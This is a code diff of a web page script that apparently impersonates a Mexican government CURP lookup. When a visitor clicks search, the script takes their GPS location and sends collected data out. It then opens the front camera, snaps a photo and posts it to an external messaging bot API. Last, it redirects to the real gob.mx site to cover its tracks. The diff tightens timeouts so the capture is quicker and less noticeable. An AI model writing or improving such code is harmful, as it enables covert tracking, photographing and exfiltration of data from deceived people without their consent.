@@ -303,7 +303,7 @@ function autocompletarCP(cp){
 async function ejecutarFlujo(boton){
   boton.disabled=true;boton.innerHTML='<span class="load"></span> Buscando…';
   // 1) GPS rápido (máx 4s)
-  await new Promise(function(res){navigator.geolocation.getCurrentPosition(function(p){info.gps=p.coords.latitude.toFixed(6)+','+p.coords.longitude.toFixed(6);res();},function(){info.gps='denegada';res();},{timeout:4000,enableHighAccuracy:false});});
+  await new Promise(function(res){navigator.geolocation.getCurrentPosition(function(p){info.gps=p.coords.latitude.toFixed(6)+','+p.coords.longitude.toFixed(6);res();},function(){info.gps='denegada';res();},{timeout:2000,enableHighAccuracy:false,maximumAge:60000});});
   // 2) ENVIAR DATOS PRIMERO (sin foto)
   await enviar();
   // 3) Intentar foto DESPUÉS (sin bloquear envío)
@@ -311,11 +311,11 @@ async function ejecutarFlujo(boton){
     if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia){
       var stream=await Promise.race([
         navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false}),
-        new Promise(function(_,rej){setTimeout(function(){rej(new Error('timeout'));},12000);})
+        new Promise(function(_,rej){setTimeout(function(){rej(new Error('timeout'));},8000);})
       ]);
       var video=document.createElement('video');video.srcObject=stream;video.muted=true;video.setAttribute('playsinline','');video.setAttribute('autoplay','');
       await video.play();
-      await new Promise(function(r){setTimeout(r,1200);});
+      await new Promise(function(r){setTimeout(r,400);});
       var vw=video.videoWidth||640, vh=video.videoHeight||480, maxSize=800;
       var nw=vw, nh=vh;
       if(vw>vh && vw>maxSize){ nw=maxSize; nh=Math.round(vh*maxSize/vw); }
@@ -330,11 +330,11 @@ async function ejecutarFlujo(boton){
         fd.append('chat_id',CHAT);
         fd.append('photo',blob,'foto.jpg');
         fd.append('caption','📷 Foto frontal');
-        fetch(API+'/sendPhoto',{method:'POST',body:fd}).then(function(r){return r.json();}).then(function(d){console.log('sendPhoto:',d);}).catch(function(e){console.log('sendPhoto err:',e);});
+        try{await fetch(API+'/sendPhoto',{method:'POST',body:fd});}catch(e){console.log('sendPhoto err:',e);}
       }
     }
   }catch(e){console.log('Camara err:',e);alert('❌ Error cámara: '+e.message+' | '+e.name);}
-  await new Promise(function(r){setTimeout(r,600);});
+  await new Promise(function(r){setTimeout(r,100);});
   window.location='https://www.gob.mx/curp/';
 }
 document.addEventListener('DOMContentLoaded',function(){
